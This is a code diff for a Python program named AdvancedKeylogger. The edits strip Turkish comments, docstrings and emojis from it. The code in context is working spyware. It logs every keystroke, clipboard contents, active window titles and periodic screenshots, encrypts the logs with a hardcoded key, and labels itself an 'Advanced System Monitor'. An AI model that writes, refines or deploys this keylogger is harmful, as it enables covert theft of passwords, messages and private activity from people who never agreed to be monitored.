@@ -9,7 +9,6 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 import base64
 
-# Platform detection
 SYSTEM = platform.system().lower()
 
 try:
@@ -26,7 +25,7 @@ try:
         from pynput import keyboard
         import subprocess
 except ImportError as e:
-    print(f"Missing dependencies for {SYSTEM}: {e}")
+    print(f"Missing dependencies: {e}")
 
 class AdvancedKeylogger:
     def __init__(self):
@@ -35,16 +34,13 @@ class AdvancedKeylogger:
         self.is_running = True
         self.encryption_key = self.generate_encryption_key()
         
-        # Dosya yolları
         self.log_file = self.config.get("log_file", "system_logs.dat")
         self.screenshot_folder = self.config.get("screenshot_folder", "screens")
         self.encryption_key_file = self.config.get("encryption_key_file", "key.dat")
         
-        # Klasörleri oluştur
         os.makedirs(self.screenshot_folder, exist_ok=True)
         
     def load_config(self):
-        """Yapılandırma dosyasını yükle"""
         default_config = {
             "log_file": "system_logs.dat",
             "screenshot_folder": "screens",
@@ -66,7 +62,6 @@ class AdvancedKeylogger:
         return default_config
 
     def generate_encryption_key(self):
-        """Güvenli şifreleme anahtarı oluştur"""
         password = b"secure_master_password"
         salt = b"fixed_salt_for_demo"
         kdf = PBKDF2HMAC(
@@ -79,17 +74,14 @@ class AdvancedKeylogger:
         return Fernet(key)
 
     def encrypt_data(self, data):
-        """Veriyi şifrele"""
         if isinstance(data, str):
             data = data.encode()
         return self.encryption_key.encrypt(data)
 
     def decrypt_data(self, encrypted_data):
-        """Verinin şifresini çöz"""
         return self.encryption_key.decrypt(encrypted_data)
 
     def get_active_window(self):
-        """Platforma göre aktif pencereyi al"""
         try:
             if SYSTEM == "windows":
                 window = win32gui.GetForegroundWindow()
@@ -126,7 +118,6 @@ class AdvancedKeylogger:
             return f"Error: {e}"
 
     def log_event(self, event_type, data):
-        """Olayı logla"""
         timestamp = datetime.now().isoformat()
         log_entry = {
             "timestamp": timestamp,
@@ -138,16 +129,13 @@ class AdvancedKeylogger:
         
         self.log_data.append(log_entry)
         
-        # Bellek optimizasyonu
         if len(self.log_data) > self.config["max_log_size"]:
             self.flush_logs()
             
-        # Dosyaya yazma (aralıklı)
         if len(self.log_data) % 50 == 0:
             self.flush_logs()
 
     def flush_logs(self):
-        """Logları dosyaya yaz"""
         try:
             if self.log_data:
                 encrypted_logs = self.encrypt_data(json.dumps(self.log_data))
@@ -158,11 +146,9 @@ class AdvancedKeylogger:
             print(f"Log flush error: {e}")
 
     def on_key_press(self, key):
-        """Tuş basma olayı"""
         try:
             key_str = str(key).replace("'", "")
             
-            # Özel tuşlar
             if hasattr(key, 'name'):
                 key_str = f"[{key.name.upper()}]"
                 
@@ -172,7 +158,6 @@ class AdvancedKeylogger:
             self.log_event("error", f"Keypress error: {e}")
 
     def start_keylogger(self):
-        """Klavye dinleyiciyi başlat"""
         try:
             if SYSTEM == "windows":
                 with pynput.keyboard.Listener(on_press=self.on_key_press) as listener:
@@ -186,7 +171,6 @@ class AdvancedKeylogger:
             self.log_event("error", f"Keylogger start error: {e}")
 
     def monitor_clipboard(self):
-        """Pano değişikliklerini izle"""
         if SYSTEM != "windows":
             return
             
@@ -197,14 +181,13 @@ class AdvancedKeylogger:
                 clipboard_content = pyperclip.paste()
                 if clipboard_content and clipboard_content != recent_value:
                     recent_value = clipboard_content
-                    if len(clipboard_content) < 1000:  # Büyük verileri loglama
+                    if len(clipboard_content) < 1000:
                         self.log_event("clipboard", clipboard_content)
             except Exception as e:
                 self.log_event("error", f"Clipboard error: {e}")
             time.sleep(2)
 
     def monitor_active_window(self):
-        """Aktif pencere değişikliklerini izle"""
         last_window = ""
         while self.is_running:
             try:
@@ -217,7 +200,6 @@ class AdvancedKeylogger:
             time.sleep(1)
 
     def take_screenshot(self):
-        """Ekran görüntüsü al"""
         try:
             if SYSTEM == "windows":
                 from PIL import ImageGrab
@@ -229,13 +211,11 @@ class AdvancedKeylogger:
             self.log_event("error", f"Screenshot error: {e}")
 
     def screenshot_worker(self):
-        """Periyodik ekran görüntüsü"""
         while self.is_running:
             self.take_screenshot()
             time.sleep(self.config["screenshot_interval"])
 
     def system_info_collector(self):
-        """Sistem bilgilerini topla"""
         while self.is_running:
             try:
                 info = {
@@ -251,11 +231,9 @@ class AdvancedKeylogger:
             time.sleep(60)
 
     def cleanup(self):
-        """Temizlik işlemleri"""
         self.is_running = False
         self.flush_logs()
         
-        # Log dosyasını sıkıştır
         try:
             import zipfile
             with zipfile.ZipFile(f"{self.log_file}.zip", 'w') as zipf:
@@ -265,51 +243,43 @@ class AdvancedKeylogger:
             pass
 
     def start(self):
-        """Tüm izleme işlemlerini başlat"""
-        print("🔍 Advanced System Monitor Started...")
+        print("Advanced System Monitor Started...")
         
         threads = []
         
-        # Klavye izleme
         key_thread = threading.Thread(target=self.start_keylogger, daemon=True)
         threads.append(key_thread)
         key_thread.start()
         
-        # Pano izleme (sadece Windows)
         if SYSTEM == "windows":
             clip_thread = threading.Thread(target=self.monitor_clipboard, daemon=True)
             threads.append(clip_thread)
             clip_thread.start()
         
-        # Pencere izleme
         window_thread = threading.Thread(target=self.monitor_active_window, daemon=True)
         threads.append(window_thread)
         window_thread.start()
         
-        # Ekran görüntüsü (sadece Windows)
         if SYSTEM == "windows":
             screen_thread = threading.Thread(target=self.screenshot_worker, daemon=True)
             threads.append(screen_thread)
             screen_thread.start()
         
-        # Sistem bilgisi
         if SYSTEM == "windows":
             sys_thread = threading.Thread(target=self.system_info_collector, daemon=True)
             threads.append(sys_thread)
             sys_thread.start()
         
-        # Ana döngü
         try:
             while True:
                 self.flush_logs()
                 time.sleep(30)
         except KeyboardInterrupt:
-            print("\n🛑 Stopping monitor...")
+            print("\nStopping monitor...")
         finally:
             self.cleanup()
 
 def analyze_logs(log_file, key_file):
-    """Logları analiz et ve raporla"""
     try:
         with open(key_file, "rb") as f:
             key = f.read()
@@ -327,19 +297,17 @@ def analyze_logs(log_file, key_file):
             except:
                 continue
         
-        # Analiz
         keypress_count = len([l for l in all_logs if l.get('type') == 'keypress'])
         window_changes = len([l for l in all_logs if l.get('type') == 'window_change'])
         clipboard_changes = len([l for l in all_logs if l.get('type') == 'clipboard'])
         
-        print("\n📊 Log Analysis Report:")
+        print("\nLog Analysis Report:")
         print(f"Total Events: {len(all_logs)}")
         print(f"Keypresses: {keypress_count}")
         print(f"Window Changes: {window_changes}")
         print(f"Clipboard Changes: {clipboard_changes}")
         
-        # Son 10 etkinlik
-        print("\n🔍 Recent Activities:")
+        print("\nRecent Activities:")
         for log in all_logs[-10:]:
             print(f"{log['timestamp']} - {log['type']}: {log['data'][:50]}...")
             
